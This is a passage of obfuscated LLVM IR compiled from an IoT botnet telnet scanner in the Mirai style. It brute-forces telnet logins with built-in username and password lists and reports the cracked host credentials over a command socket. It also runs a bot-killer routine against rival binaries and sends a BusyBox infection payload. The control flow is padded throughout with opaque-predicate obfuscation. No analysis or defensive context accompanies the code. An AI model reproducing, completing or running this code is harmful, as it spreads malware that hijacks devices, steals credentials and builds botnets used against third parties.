  %798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %797
  call void @advance_telstate(%struct.telstate_t* %798, i32 5)
  %799 = load i32, i32* @x.93
  %800 = load i32, i32* @y.94
  %801 = sub i32 %799, 1
  %802 = mul i32 %799, %801
  %803 = urem i32 %802, 2
  %804 = icmp eq i32 %803, 0
  %805 = icmp slt i32 %800, 10
  %806 = or i1 %804, %805
  br i1 %806, label %originalBBpart297, label %originalBB95alteredBB

originalBBpart297:                                ; preds = %originalBB95
  br label %807

; <label>:807:                                    ; preds = %originalBBpart297, %783
  %808 = load i32, i32* @x.93
  %809 = load i32, i32* @y.94
  %810 = sub i32 %808, 1
  %811 = mul i32 %808, %810
  %812 = urem i32 %811, 2
  %813 = icmp eq i32 %812, 0
  %814 = icmp slt i32 %809, 10
  %815 = or i1 %813, %814
  br i1 %815, label %originalBB99, label %originalBB99alteredBB

originalBB99:                                     ; preds = %originalBB99alteredBB, %807
  %816 = load i32, i32* @x.93
  %817 = load i32, i32* @y.94
  %818 = sub i32 %816, 1
  %819 = mul i32 %816, %818
  %820 = urem i32 %819, 2
  %821 = icmp eq i32 %820, 0
  %822 = icmp slt i32 %817, 10
  %823 = or i1 %821, %822
  br i1 %823, label %originalBBpart2101, label %originalBB99alteredBB

originalBBpart2101:                               ; preds = %originalBB99
  br label %1348

; <label>:824:                                    ; preds = %755
  %825 = load i32, i32* @x.93
  %826 = load i32, i32* @y.94
  %827 = sub i32 %825, 1
  %828 = mul i32 %825, %827
  %829 = urem i32 %828, 2
  %830 = icmp eq i32 %829, 0
  %831 = icmp slt i32 %826, 10
  %832 = or i1 %830, %831
  br i1 %832, label %originalBB103, label %originalBB103alteredBB

originalBB103:                                    ; preds = %originalBB103alteredBB, %824
  %833 = load i32, i32* %6, align 4
  %834 = sext i32 %833 to i64
  %835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %834
  %836 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %835, i32 0, i32 9
  %837 = load i32, i32* %836, align 8
  %838 = add i32 %837, 7
  %839 = zext i32 %838 to i64
  %840 = call i64 @time(i64* null) #5
  %841 = icmp slt i64 %839, %840
  %842 = load i32, i32* @x.93
  %843 = load i32, i32* @y.94
  %844 = sub i32 %842, 1
  %845 = mul i32 %842, %844
  %846 = urem i32 %845, 2
  %847 = icmp eq i32 %846, 0
  %848 = icmp slt i32 %843, 10
  %849 = or i1 %847, %848
  br i1 %849, label %originalBBpart2109, label %originalBB103alteredBB

originalBBpart2109:                               ; preds = %originalBB103
  br i1 %841, label %850, label %854

; <label>:850:                                    ; preds = %originalBBpart2109
  %851 = load i32, i32* %6, align 4
  %852 = sext i32 %851 to i64
  %853 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %852
  call void @reset_telstate(%struct.telstate_t* %853)
  br label %854

; <label>:854:                                    ; preds = %850, %originalBBpart2109
  br label %1331

; <label>:855:                                    ; preds = %138
  %856 = load i32, i32* %6, align 4
  %857 = sext i32 %856 to i64
  %858 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %857
  %859 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %858, i32 0, i32 0
  %860 = load i32, i32* %859, align 8
  %861 = load i32, i32* %6, align 4
  %862 = sext i32 %861 to i64
  %863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %862
  %864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %863, i32 0, i32 6
  %865 = load i8, i8* %864, align 1
  %866 = zext i8 %865 to i64
  %867 = getelementptr inbounds [63 x i8*], [63 x i8*]* @Mirai_Passwords, i64 0, i64 %866
  %868 = load i8*, i8** %867, align 8
  %869 = load i32, i32* %6, align 4
  %870 = sext i32 %869 to i64
  %871 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %870
  %872 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %871, i32 0, i32 6
  %873 = load i8, i8* %872, align 1
  %874 = zext i8 %873 to i64
  %875 = getelementptr inbounds [63 x i8*], [63 x i8*]* @Mirai_Passwords, i64 0, i64 %874
  %876 = load i8*, i8** %875, align 8
  %877 = call i64 @strlen(i8* %876) #9
  %878 = call i64 @send(i32 %860, i8* %868, i64 %877, i32 16384)
  %879 = icmp slt i64 %878, 0
  br i1 %879, label %880, label %884

; <label>:880:                                    ; preds = %855
  %881 = load i32, i32* %6, align 4
  %882 = sext i32 %881 to i64
  %883 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %882
  call void @reset_telstate(%struct.telstate_t* %883)
  br label %1348

; <label>:884:                                    ; preds = %855
  %885 = load i32, i32* %6, align 4
  %886 = sext i32 %885 to i64
  %887 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %886
  %888 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %887, i32 0, i32 0
  %889 = load i32, i32* %888, align 8
  %890 = call i64 @send(i32 %889, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.866, i32 0, i32 0), i64 2, i32 16384)
  %891 = icmp slt i64 %890, 0
  br i1 %891, label %892, label %896

; <label>:892:                                    ; preds = %884
  %893 = load i32, i32* %6, align 4
  %894 = sext i32 %893 to i64
  %895 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %894
  call void @reset_telstate(%struct.telstate_t* %895)
  br label %1348

; <label>:896:                                    ; preds = %884
  %897 = load i32, i32* %6, align 4
  %898 = sext i32 %897 to i64
  %899 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %898
  call void @advance_telstate(%struct.telstate_t* %899, i32 6)
  br label %1331

; <label>:900:                                    ; preds = %138
  %901 = load i32, i32* %6, align 4
  %902 = sext i32 %901 to i64
  %903 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %902
  %904 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %903, i32 0, i32 0
  %905 = load i32, i32* %904, align 8
  %906 = load i32, i32* %3, align 4
  %907 = load i32, i32* %6, align 4
  %908 = sext i32 %907 to i64
  %909 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %908
  %910 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %909, i32 0, i32 11
  %911 = load i8*, i8** %910, align 8
  %912 = call i32 @read_until_response(i32 %905, i32 %906, i8* %911, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %913 = icmp ne i32 %912, 0
  br i1 %913, label %914, label %1039

; <label>:914:                                    ; preds = %900
  %915 = call i64 @time(i64* null) #5
  %916 = trunc i64 %915 to i32
  %917 = load i32, i32* %6, align 4
  %918 = sext i32 %917 to i64
  %919 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %918
  %920 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %919, i32 0, i32 9
  store i32 %916, i32* %920, align 8
  %921 = load i32, i32* %6, align 4
  %922 = sext i32 %921 to i64
  %923 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %922
  %924 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %923, i32 0, i32 11
  %925 = load i8*, i8** %924, align 8
  %926 = call i32 @contains_fail(i8* %925)
  %927 = icmp ne i32 %926, 0
  br i1 %927, label %928, label %932

; <label>:928:                                    ; preds = %914
  %929 = load i32, i32* %6, align 4
  %930 = sext i32 %929 to i64
  %931 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %930
  call void @advance_telstate(%struct.telstate_t* %931, i32 0)
  br label %1038

; <label>:932:                                    ; preds = %914
  %933 = load i32, i32* %6, align 4
  %934 = sext i32 %933 to i64
  %935 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %934
  %936 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %935, i32 0, i32 11
  %937 = load i8*, i8** %936, align 8
  %938 = call i32 @contains_success(i8* %937)
  %939 = icmp ne i32 %938, 0
  br i1 %939, label %940, label %1033

; <label>:940:                                    ; preds = %932
  %941 = load i32, i32* %6, align 4
  %942 = sext i32 %941 to i64
  %943 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %942
  %944 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %943, i32 0, i32 4
  %945 = load i8, i8* %944, align 1
  %946 = zext i8 %945 to i32
  %947 = icmp eq i32 %946, 2
  br i1 %947, label %948, label %968

; <label>:948:                                    ; preds = %940
  %949 = load i32, i32* @x.93
  %950 = load i32, i32* @y.94
  %951 = sub i32 %949, 1
  %952 = mul i32 %949, %951
  %953 = urem i32 %952, 2
  %954 = icmp eq i32 %953, 0
  %955 = icmp slt i32 %950, 10
  %956 = or i1 %954, %955
  br i1 %956, label %originalBB111, label %originalBB111alteredBB

originalBB111:                                    ; preds = %originalBB111alteredBB, %948
  %957 = load i32, i32* %6, align 4
  %958 = sext i32 %957 to i64
  %959 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %958
  call void @advance_telstate(%struct.telstate_t* %959, i32 7)
  %960 = load i32, i32* @x.93
  %961 = load i32, i32* @y.94
  %962 = sub i32 %960, 1
  %963 = mul i32 %960, %962
  %964 = urem i32 %963, 2
  %965 = icmp eq i32 %964, 0
  %966 = icmp slt i32 %961, 10
  %967 = or i1 %965, %966
  br i1 %967, label %originalBBpart2113, label %originalBB111alteredBB

originalBBpart2113:                               ; preds = %originalBB111
  br label %1016

; <label>:968:                                    ; preds = %940
  %969 = load i32, i32* @mainCommSock, align 4
  %970 = load i32, i32* %6, align 4
  %971 = sext i32 %970 to i64
  %972 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %971
  %973 = call i8* @get_telstate_host(%struct.telstate_t* %972)
  %974 = load i32, i32* %6, align 4
  %975 = sext i32 %974 to i64
  %976 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %975
  %977 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %976, i32 0, i32 5
  %978 = load i8, i8* %977, align 2
  %979 = zext i8 %978 to i64
  %980 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Usernames, i64 0, i64 %979
  %981 = load i8*, i8** %980, align 8
  %982 = load i32, i32* %6, align 4
  %983 = sext i32 %982 to i64
  %984 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %983
  %985 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %984, i32 0, i32 6
  %986 = load i8, i8* %985, align 1
  %987 = zext i8 %986 to i64
  %988 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Passwords, i64 0, i64 %987
  %989 = load i8*, i8** %988, align 8
  %990 = call i32 (i32, i8*, ...) @sockprintf(i32 %969, i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.867, i32 0, i32 0), i8* %973, i8* %981, i8* %989)
  %991 = load i32, i32* @mainCommSock, align 4
  %992 = load i32, i32* %6, align 4
  %993 = sext i32 %992 to i64
  %994 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %993
  %995 = call i8* @get_telstate_host(%struct.telstate_t* %994)
  %996 = load i32, i32* %6, align 4
  %997 = sext i32 %996 to i64
  %998 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %997
  %999 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %998, i32 0, i32 5
  %1000 = load i8, i8* %999, align 2
  %1001 = zext i8 %1000 to i64
  %1002 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Usernames, i64 0, i64 %1001
  %1003 = load i8*, i8** %1002, align 8
  %1004 = load i32, i32* %6, align 4
  %1005 = sext i32 %1004 to i64
  %1006 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1005
  %1007 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1006, i32 0, i32 6
  %1008 = load i8, i8* %1007, align 1
  %1009 = zext i8 %1008 to i64
  %1010 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Passwords, i64 0, i64 %1009
  %1011 = load i8*, i8** %1010, align 8
  %1012 = call i32 (i32, i8*, ...) @sockprintf(i32 %991, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.865, i32 0, i32 0), i8* %995, i8* %1003, i8* %1011)
  %1013 = load i32, i32* %6, align 4
  %1014 = sext i32 %1013 to i64
  %1015 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1014
  call void @advance_telstate(%struct.telstate_t* %1015, i32 7)
  br label %1016

; <label>:1016:                                   ; preds = %968, %originalBBpart2113
  %1017 = load i32, i32* @x.93
  %1018 = load i32, i32* @y.94
  %1019 = sub i32 %1017, 1
  %1020 = mul i32 %1017, %1019
  %1021 = urem i32 %1020, 2
  %1022 = icmp eq i32 %1021, 0
  %1023 = icmp slt i32 %1018, 10
  %1024 = or i1 %1022, %1023
  br i1 %1024, label %originalBB115, label %originalBB115alteredBB

originalBB115:                                    ; preds = %originalBB115alteredBB, %1016
  %1025 = load i32, i32* @x.93
  %1026 = load i32, i32* @y.94
  %1027 = sub i32 %1025, 1
  %1028 = mul i32 %1025, %1027
  %1029 = urem i32 %1028, 2
  %1030 = icmp eq i32 %1029, 0
  %1031 = icmp slt i32 %1026, 10
  %1032 = or i1 %1030, %1031
  br i1 %1032, label %originalBBpart2117, label %originalBB115alteredBB

originalBBpart2117:                               ; preds = %originalBB115
  br label %1037

; <label>:1033:                                   ; preds = %932
  %1034 = load i32, i32* %6, align 4
  %1035 = sext i32 %1034 to i64
  %1036 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1035
  call void @reset_telstate(%struct.telstate_t* %1036)
  br label %1037

; <label>:1037:                                   ; preds = %1033, %originalBBpart2117
  br label %1038

; <label>:1038:                                   ; preds = %1037, %928
  br label %1348

; <label>:1039:                                   ; preds = %900
  %1040 = load i32, i32* %6, align 4
  %1041 = sext i32 %1040 to i64
  %1042 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1041
  %1043 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1042, i32 0, i32 9
  %1044 = load i32, i32* %1043, align 8
  %1045 = add i32 %1044, 7
  %1046 = zext i32 %1045 to i64
  %1047 = call i64 @time(i64* null) #5
  %1048 = icmp slt i64 %1046, %1047
  br i1 %1048, label %1049, label %1053

; <label>:1049:                                   ; preds = %1039
  %1050 = load i32, i32* %6, align 4
  %1051 = sext i32 %1050 to i64
  %1052 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1051
  call void @reset_telstate(%struct.telstate_t* %1052)
  br label %1053

; <label>:1053:                                   ; preds = %1049, %1039
  br label %1331

; <label>:1054:                                   ; preds = %138
  %1055 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %1056 = call i32 (i8*, i8*, ...) @sprintf(i8* %1055, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.868, i32 0, i32 0), i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @Temp_Directorys, i32 0, i32 0)) #5
  %1057 = load i32, i32* %6, align 4
  %1058 = sext i32 %1057 to i64
  %1059 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1058
  %1060 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1059, i32 0, i32 0
  %1061 = load i32, i32* %1060, align 8
  %1062 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %1063 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %1064 = call i64 @strlen(i8* %1063) #9
  %1065 = call i64 @send(i32 %1061, i8* %1062, i64 %1064, i32 16384)
  %1066 = icmp slt i64 %1065, 0
  br i1 %1066, label %1067, label %1071

; <label>:1067:                                   ; preds = %1054
  %1068 = load i32, i32* %6, align 4
  %1069 = sext i32 %1068 to i64
  %1070 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1069
  call void @reset_telstate(%struct.telstate_t* %1070)
  br label %1348

; <label>:1071:                                   ; preds = %1054
  %1072 = load i32, i32* @x.93
  %1073 = load i32, i32* @y.94
  %1074 = sub i32 %1072, 1
  %1075 = mul i32 %1072, %1074
  %1076 = urem i32 %1075, 2
  %1077 = icmp eq i32 %1076, 0
  %1078 = icmp slt i32 %1073, 10
  %1079 = or i1 %1077, %1078
  br i1 %1079, label %originalBB119, label %originalBB119alteredBB

originalBB119:                                    ; preds = %originalBB119alteredBB, %1071
  call void @RemoveTempDirs()
  %1080 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %1081 = call i32 (i8*, i8*, ...) @sprintf(i8* %1080, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.869, i32 0, i32 0), i8** getelementptr inbounds ([347 x i8*], [347 x i8*]* @Bot_Killer_Binarys, i32 0, i32 0), i8** getelementptr inbounds ([347 x i8*], [347 x i8*]* @Bot_Killer_Binarys, i32 0, i32 0)) #5
  %1082 = load i32, i32* %6, align 4
  %1083 = sext i32 %1082 to i64
  %1084 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1083
  %1085 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1084, i32 0, i32 0
  %1086 = load i32, i32* %1085, align 8
  %1087 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %1088 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %1089 = call i64 @strlen(i8* %1088) #9
  %1090 = call i64 @send(i32 %1086, i8* %1087, i64 %1089, i32 16384)
  %1091 = icmp slt i64 %1090, 0
  %1092 = load i32, i32* @x.93
  %1093 = load i32, i32* @y.94
  %1094 = sub i32 %1092, 1
  %1095 = mul i32 %1092, %1094
  %1096 = urem i32 %1095, 2
  %1097 = icmp eq i32 %1096, 0
  %1098 = icmp slt i32 %1093, 10
  %1099 = or i1 %1097, %1098
  br i1 %1099, label %originalBBpart2121, label %originalBB119alteredBB

originalBBpart2121:                               ; preds = %originalBB119
  br i1 %1091, label %1100, label %1104

; <label>:1100:                                   ; preds = %originalBBpart2121
  %1101 = load i32, i32* %6, align 4
  %1102 = sext i32 %1101 to i64
  %1103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1102
  call void @reset_telstate(%struct.telstate_t* %1103)
  br label %1348

; <label>:1104:                                   ; preds = %originalBBpart2121
  %1105 = load i32, i32* @x.93
  %1106 = load i32, i32* @y.94
  %1107 = sub i32 %1105, 1
  %1108 = mul i32 %1105, %1107
  %1109 = urem i32 %1108, 2
  %1110 = icmp eq i32 %1109, 0
  %1111 = icmp slt i32 %1106, 10
  %1112 = or i1 %1110, %1111
  br i1 %1112, label %originalBB123, label %originalBB123alteredBB

originalBB123:                                    ; preds = %originalBB123alteredBB, %1104
  %1113 = load i32, i32* %6, align 4
  %1114 = sext i32 %1113 to i64
  %1115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1114
  call void @advance_telstate(%struct.telstate_t* %1115, i32 8)
  %1116 = load i32, i32* @x.93
  %1117 = load i32, i32* @y.94
  %1118 = sub i32 %1116, 1
  %1119 = mul i32 %1116, %1118
  %1120 = urem i32 %1119, 2
  %1121 = icmp eq i32 %1120, 0
  %1122 = icmp slt i32 %1117, 10
  %1123 = or i1 %1121, %1122
  br i1 %1123, label %originalBBpart2125, label %originalBB123alteredBB

originalBBpart2125:                               ; preds = %originalBB123
  br label %1331

; <label>:1124:                                   ; preds = %138
  %1125 = call i64 @time(i64* null) #5
  %1126 = trunc i64 %1125 to i32
  %1127 = load i32, i32* %6, align 4
  %1128 = sext i32 %1127 to i64
  %1129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1128
  %1130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1129, i32 0, i32 9
  store i32 %1126, i32* %1130, align 8
  %1131 = load i32, i32* %6, align 4
  %1132 = sext i32 %1131 to i64
  %1133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1132
  %1134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1133, i32 0, i32 0
  %1135 = load i32, i32* %1134, align 8
  %1136 = call i64 @send(i32 %1135, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.870, i32 0, i32 0), i64 4, i32 16384)
  %1137 = icmp slt i64 %1136, 0
  br i1 %1137, label %1138, label %1155

; <label>:1138:                                   ; preds = %1124
  %1139 = load i32, i32* @x.93
  %1140 = load i32, i32* @y.94
  %1141 = sub i32 %1139, 1
  %1142 = mul i32 %1139, %1141
  %1143 = urem i32 %1142, 2
  %1144 = icmp eq i32 %1143, 0
  %1145 = icmp slt i32 %1140, 10
  %1146 = or i1 %1144, %1145
  br i1 %1146, label %originalBB127, label %originalBB127alteredBB

originalBB127:                                    ; preds = %originalBB127alteredBB, %1138
  %1147 = load i32, i32* @x.93
  %1148 = load i32, i32* @y.94
  %1149 = sub i32 %1147, 1
  %1150 = mul i32 %1147, %1149
  %1151 = urem i32 %1150, 2
  %1152 = icmp eq i32 %1151, 0
  %1153 = icmp slt i32 %1148, 10
  %1154 = or i1 %1152, %1153
  br i1 %1154, label %originalBBpart2129, label %originalBB127alteredBB

originalBBpart2129:                               ; preds = %originalBB127
  br label %1155

; <label>:1155:                                   ; preds = %originalBBpart2129, %1124
  %1156 = load i32, i32* %6, align 4
  %1157 = sext i32 %1156 to i64
  %1158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1157
  %1159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1158, i32 0, i32 0
  %1160 = load i32, i32* %1159, align 8
  %1161 = call i64 @send(i32 %1160, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.871, i32 0, i32 0), i64 7, i32 16384)
  %1162 = icmp slt i64 %1161, 0
  br i1 %1162, label %1163, label %1180

; <label>:1163:                                   ; preds = %1155
  %1164 = load i32, i32* @x.93
  %1165 = load i32, i32* @y.94
  %1166 = sub i32 %1164, 1
  %1167 = mul i32 %1164, %1166
  %1168 = urem i32 %1167, 2
  %1169 = icmp eq i32 %1168, 0
  %1170 = icmp slt i32 %1165, 10
  %1171 = or i1 %1169, %1170
  br i1 %1171, label %originalBB131, label %originalBB131alteredBB

originalBB131:                                    ; preds = %originalBB131alteredBB, %1163
  %1172 = load i32, i32* @x.93
  %1173 = load i32, i32* @y.94
  %1174 = sub i32 %1172, 1
  %1175 = mul i32 %1172, %1174
  %1176 = urem i32 %1175, 2
  %1177 = icmp eq i32 %1176, 0
  %1178 = icmp slt i32 %1173, 10
  %1179 = or i1 %1177, %1178
  br i1 %1179, label %originalBBpart2133, label %originalBB131alteredBB

originalBBpart2133:                               ; preds = %originalBB131
  br label %1180

; <label>:1180:                                   ; preds = %originalBBpart2133, %1155
  %1181 = load i32, i32* @x.93
  %1182 = load i32, i32* @y.94
  %1183 = sub i32 %1181, 1
  %1184 = mul i32 %1181, %1183
  %1185 = urem i32 %1184, 2
  %1186 = icmp eq i32 %1185, 0
  %1187 = icmp slt i32 %1182, 10
  %1188 = or i1 %1186, %1187
  br i1 %1188, label %originalBB135, label %originalBB135alteredBB

originalBB135:                                    ; preds = %originalBB135alteredBB, %1180
  %1189 = load i32, i32* %6, align 4
  %1190 = sext i32 %1189 to i64
  %1191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1190
  %1192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1191, i32 0, i32 0
  %1193 = load i32, i32* %1192, align 8
  %1194 = load i8*, i8** @Busybox_Payload, align 8
  %1195 = load i8*, i8** @Busybox_Payload, align 8
  %1196 = call i64 @strlen(i8* %1195) #9
  %1197 = call i64 @send(i32 %1193, i8* %1194, i64 %1196, i32 16384)
  %1198 = icmp slt i64 %1197, 0
  %1199 = load i32, i32* @x.93
  %1200 = load i32, i32* @y.94
  %1201 = sub i32 %1199, 1
  %1202 = mul i32 %1199, %1201
  %1203 = urem i32 %1202, 2
  %1204 = icmp eq i32 %1203, 0
  %1205 = icmp slt i32 %1200, 10
  %1206 = or i1 %1204, %1205
  br i1 %1206, label %originalBBpart2137, label %originalBB135alteredBB

originalBBpart2137:                               ; preds = %originalBB135
  br i1 %1198, label %1207, label %1227

; <label>:1207:                                   ; preds = %originalBBpart2137
  %1208 = load i32, i32* @x.93
  %1209 = load i32, i32* @y.94
  %1210 = sub i32 %1208, 1
  %1211 = mul i32 %1208, %1210
  %1212 = urem i32 %1211, 2
  %1213 = icmp eq i32 %1212, 0
  %1214 = icmp slt i32 %1209, 10
  %1215 = or i1 %1213, %1214
  br i1 %1215, label %originalBB139, label %originalBB139alteredBB

originalBB139:                                    ; preds = %originalBB139alteredBB, %1207
  %1216 = load i32, i32* %6, align 4
  %1217 = sext i32 %1216 to i64
  %1218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1217
  call void @reset_telstate(%struct.telstate_t* %1218)
  %1219 = load i32, i32* @x.93
  %1220 = load i32, i32* @y.94
  %1221 = sub i32 %1219, 1
  %1222 = mul i32 %1219, %1221
  %1223 = urem i32 %1222, 2
  %1224 = icmp eq i32 %1223, 0
  %1225 = icmp slt i32 %1220, 10
  %1226 = or i1 %1224, %1225
  br i1 %1226, label %originalBBpart2141, label %originalBB139alteredBB

originalBBpart2141:                               ; preds = %originalBB139
  br label %1348

; <label>:1227:                                   ; preds = %originalBBpart2137
  %1228 = load i32, i32* %6, align 4
  %1229 = sext i32 %1228 to i64
  %1230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1229
  %1231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1230, i32 0, i32 0
  %1232 = load i32, i32* %1231, align 8
  %1233 = load i32, i32* %3, align 4
  %1234 = load i32, i32* %6, align 4
  %1235 = sext i32 %1234 to i64
  %1236 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1235
  %1237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1236, i32 0, i32 11
  %1238 = load i8*, i8** %1237, align 8
  %1239 = call i32 @read_until_response(i32 %1232, i32 %1233, i8* %1238, i32 1024, i8** bitcast ([10 x i8]* @.str.873 to i8**))
  %1240 = icmp ne i32 %1239, 0
  br i1 %1240, label %1241, label %1259

; <label>:1241:                                   ; preds = %1227
  %1242 = load i32, i32* %6, align 4
  %1243 = sext i32 %1242 to i64
  %1244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1243
  %1245 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1244, i32 0, i32 11
  %1246 = load i8*, i8** %1245, align 8
  %1247 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %1246, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.872, i32 0, i32 0))
  %1248 = icmp ne i32 %1247, 0
  br i1 %1248, label %1249, label %1258

; <label>:1249:                                   ; preds = %1241
  %1250 = load i32, i32* %6, align 4
  %1251 = sext i32 %1250 to i64
  %1252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1251
  %1253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1252, i32 0, i32 4
  %1254 = load i8, i8* %1253, align 1
  %1255 = zext i8 %1254 to i32
  %1256 = icmp ne i32 %1255, 3
  br i1 %1256, label %1257, label %1258

; <label>:1257:                                   ; preds = %1249
  br label %1258

; <label>:1258:                                   ; preds = %1257, %1249, %1241
  br label %1259

; <label>:1259:                                   ; preds = %1258, %1227
  %1260 = load i32, i32* @x.93
  %1261 = load i32, i32* @y.94
  %1262 = sub i32 %1260, 1
  %1263 = mul i32 %1260, %1262
  %1264 = urem i32 %1263, 2
  %1265 = icmp eq i32 %1264, 0
  %1266 = icmp slt i32 %1261, 10
  %1267 = or i1 %1265, %1266
  br i1 %1267, label %originalBB143, label %originalBB143alteredBB

originalBB143:                                    ; preds = %originalBB143alteredBB, %1259
  %1268 = load i32, i32* %6, align 4
  %1269 = sext i32 %1268 to i64
  %1270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1269
  %1271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1270, i32 0, i32 9
  %1272 = load i32, i32* %1271, align 8
  %1273 = add i32 %1272, 60
  %1274 = zext i32 %1273 to i64
  %1275 = call i64 @time(i64* null) #5
  %1276 = icmp slt i64 %1274, %1275
  %1277 = load i32, i32* @x.93
  %1278 = load i32, i32* @y.94
  %1279 = sub i32 %1277, 1
  %1280 = mul i32 %1277, %1279
  %1281 = urem i32 %1280, 2
  %1282 = icmp eq i32 %1281, 0
  %1283 = icmp slt i32 %1278, 10
  %1284 = or i1 %1282, %1283
  br i1 %1284, label %originalBBpart2147, label %originalBB143alteredBB

originalBBpart2147:                               ; preds = %originalBB143
  br i1 %1276, label %1285, label %1330

; <label>:1285:                                   ; preds = %originalBBpart2147
  %1286 = load i32, i32* @x.93
  %1287 = load i32, i32* @y.94
  %1288 = sub i32 %1286, 1
  %1289 = mul i32 %1286, %1288
  %1290 = urem i32 %1289, 2
  %1291 = icmp eq i32 %1290, 0
  %1292 = icmp slt i32 %1287, 10
  %1293 = or i1 %1291, %1292
  br i1 %1293, label %originalBB149, label %originalBB149alteredBB

originalBB149:                                    ; preds = %originalBB149alteredBB, %1285
  %1294 = load i32, i32* %6, align 4
  %1295 = sext i32 %1294 to i64
